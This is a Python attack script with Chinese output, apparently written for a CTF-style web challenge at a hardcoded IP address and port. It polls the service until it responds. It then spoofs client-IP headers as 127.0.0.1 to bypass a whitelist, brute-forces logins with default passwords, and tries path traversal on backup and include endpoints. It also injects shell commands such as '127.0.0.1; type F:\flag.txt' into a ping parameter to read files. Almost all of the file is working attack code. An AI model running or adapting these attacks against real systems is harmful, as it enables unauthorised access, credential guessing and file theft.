import socket
import time
import re

TARGET = "119.29.238.216"
PORT = 8088
CHECK_INTERVAL = 15
MAX_ATTEMPTS = 20

FLAGS_FOUND = []

def add_flag(location, content):
    FLAGS_FOUND.append({"location": location, "content": content})
    print(f"\n  🚩 FLAG FOUND!")
    print(f"     位置: {location}")
    print(f"     内容: {content}")

def check_flag(text):
    patterns = [r'flag\{[^}]+\}', r'FLAG\{[^}]+\}', r'ctf\{[^}]+\}', r'CTF\{[^}]+\}']
    for pattern in patterns:
        matches = re.findall(pattern, text, re.IGNORECASE)
        for match in matches:
            return match
    return None

def send_request(path, params="", headers="", method="GET", body=""):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    try:
        s.connect((TARGET, PORT))
        full_path = path + ("?" + params if params else "")
        req = f'{method} {full_path} HTTP/1.1\r\nHost: {TARGET}:{PORT}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0\r\n{headers}\r\nConnection: close\r\n'
        if body:
            req += f'Content-Length: {len(body)}\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n{body}'
        else:
            req += '\r\n'
        s.send(req.encode())
        
        resp = b''
        while True:
            try:
                data = s.recv(4096)
                if not data:
                    break
                resp += data
            except:
                break
        
        lines = resp.split(b'\r\n')
        status = lines[0].decode('utf-8', errors='ignore') if lines else ""
        body = b'\r\n'.join(lines[lines.index(b'')+1:]) if b'' in lines else b''
        s.close()
        return status, body.decode('utf-8', errors='ignore')
    
    except Exception as e:
        s.close()
        return f"ERROR: {e}", ""

def test_ip_spoofing():
    print("\n" + "="*70)
    print("IP伪装攻击 - 开始测试")
    print("="*70)
    
    ip_headers = [
        "X-Forwarded-For: 127.0.0.1\r\nX-Real-IP: 127.0.0.1\r\nX-Client-IP: 127.0.0.1",
        "X-Forwarded-For: localhost\r\nX-Real-IP: localhost",
        "X-Forwarded-For: 0:0:0:0:0:0:0:1\r\nX-Real-IP: ::1",
        "X-Forwarded-For: 10.0.0.1\r\nX-Real-IP: 10.0.0.1",
        "Forwarded: for=127.0.0.1",
    ]
    
    print("\n--- 测试登录页面 ---")
    for headers in ip_headers:
        status, body = send_request("/login", headers=headers)
        if "200" in status:
            print(f"\n[{status}] IP伪装: {headers[:50]}...")
            if len(body) > 100:
                print(f"  Body: {body[:300]}")
                
                csrf = re.search(r'name=["\']csrf["\']\s*value=["\']([^"\']+)["\']', body)
                csrf_token = csrf.group(1) if csrf else ""
                
                if csrf_token:
                    print(f"  CSRF Token: {csrf_token[:20]}...")
                    
                    credentials = [
                        ("admin", "admin"),
                        ("admin", "123456"),
                        ("admin", "password"),
                        ("admin", "ctf"),
                        ("admin", "term3lab"),
                        ("root", "root"),
                    ]
                    
                    for username, password in credentials:
                        login_body = f"username={username}&password={password}&csrf={csrf_token}"
                        status2, body2 = send_request("/login", method="POST", body=login_body, headers=headers)
                        
                        if "200" in status2:
                            if "用户名或密码错误" not in body2 or len(body2) > 1000:
                                print(f"\n    🎉 登录测试: {username}/{password}")
                                print(f"    Status: {status2}")
                                print(f"    Response: {body2[:500]}")
                                
                                flag = check_flag(body2)
                                if flag:
                                    add_flag(f"Login {username}/{password}", flag)
                                    return True
    
    print("\n--- 测试Backup页面 ---")
    backup_paths = [
        "F:\\small peoject\\python-lab\\flag.txt",
        "F:\\small peoject\\python-lab\\flag",
        "F:\\flag.txt",
        "F:\\flag",
        "C:\\flag.txt",
        "/flag.txt",
        "./flag.txt",
        "../flag.txt",
    ]
    
    for headers in ip_headers[:2]:
        for path in backup_paths:
            status, body = send_request("/backup", params=f"path={path}", headers=headers)
            if "200" in status:
                print(f"\n[{status}] /backup?path={path}")
                if len(body) > 50 and "Blocked" not in body:
                    print(f"  Body: {body[:500]}")
                    flag = check_flag(body)
                    if flag:
                        add_flag(f"Backup {path}", flag)
                        return True
    
    print("\n--- 测试Include页面 ---")
    include_pages = [
        "welcome",
        "../flag.txt",
        "../../flag.txt",
        "/flag.txt",
        "flag",
        "secret",
    ]
    
    for headers in ip_headers[:2]:
        for page in include_pages:
            status, body = send_request("/include", params=f"page={page}", headers=headers)
            if "200" in status:
                print(f"\n[{status}] /include?page={page}")
                if len(body) > 50 and "Blocked" not in body:
                    print(f"  Body: {body[:500]}")
                    flag = check_flag(body)
                    if flag:
                        add_flag(f"Include {page}", flag)
                        return True
    
    print("\n--- 测试Ping页面 ---")
    ping_hosts = [
        "127.0.0.1",
        "127.0.0.1; type F:\\flag.txt",
        "127.0.0.1; type F:\\small peoject\\python-lab\\flag.txt",
        "; type F:\\flag.txt",
    ]
    
    for headers in ip_headers[:2]:
        for host in ping_hosts:
            status, body = send_request("/ping", params=f"host={host}", headers=headers)
            if "200" in status:
                print(f"\n[{status}] /ping?host={host[:30]}")
                if len(body) > 50 and "Blocked" not in body:
                    print(f"  Body: {body[:500]}")
                    flag = check_flag(body)
                    if flag:
                        add_flag(f"Ping {host}", flag)
                        return True
    
    print("\n--- 测试Dashboard页面 ---")
    for headers in ip_headers[:2]:
        status, body = send_request("/dashboard", headers=headers)
        if "200" in status:
            print(f"\n[{status}] /dashboard")
            print(f"  Body: {body[:500]}")
            flag = check_flag(body)
            if flag:
                add_flag("Dashboard", flag)
                return True
    
    print("\n--- 测试源码页面 ---")
    source_pages = ["/upload-source", "/backup-source", "/full-source", "/server-source"]
    for headers in ip_headers[:2]:
        for page in source_pages:
            status, body = send_request(page, headers=headers)
            if "200" in status and len(body) > 500:
                print(f"\n[{status}] {page}")
                print(f"  内容长度: {len(body)}")
                flag = check_flag(body)
                if flag:
                    add_flag(f"Source {page}", flag)
                    return True
    
    return False

def main():
    print("*"*70)
    print("  持续监控与IP伪装攻击")
    print("  目标: " + TARGET + ":" + str(PORT))
    print("*"*70)
    
    print("\n  思路:")
    print("  1. 持续监控服务状态")
    print("  2. 服务恢复后立即执行IP伪装攻击")
    print("  3. 伪装IP为127.0.0.1绕过白名单")
    
    for attempt in range(MAX_ATTEMPTS):
        print(f"\n[{time.strftime('%H:%M:%S')}] 检查服务状态... (尝试 {attempt+1}/{MAX_ATTEMPTS})")
        
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        try:
            s.connect((TARGET, PORT))
            s.send(b'GET / HTTP/1.1\r\nHost: test\r\nConnection: close\r\n\r\n')
            resp = s.recv(1024)
            s.close()
            
            if resp:
                first_line = resp.split(b'\r\n')[0].decode('utf-8', errors='ignore')
                print(f"     响应: {first_line}")
                
                if "200" in first_line:
                    print("\n     ✅ 服务恢复! 开始攻击...")
                    
                    if test_ip_spoofing():
                        print("\n" + "="*70)
                        print("🎉 攻击成功!")
                        print("="*70)
                        for flag_info in FLAGS_FOUND:
                            print(f"\n  FLAG: {flag_info['content']}")
                            print(f"  位置: {flag_info['location']}")
                        return
                    else:
                        print("\n     ❌ 攻击未成功，继续监控")
                elif "502" in first_line:
                    print("     ⚠️  后端服务未启动")
                else:
                    print(f"     状态: {first_line}")
            
        except Exception as e:
            print(f"     错误: {e}")
        
        time.sleep(CHECK_INTERVAL)
    
    print("\n" + "="*70)
    print("  监控超时，服务未恢复")
    print("="*70)
    print("\n  建议:")
    print("     1. 手动检查服务器状态")
    print("     2. 检查宝塔面板(8888端口)")
    print("     3. 重启后端应用")

if __name__ == "__main__":
    main()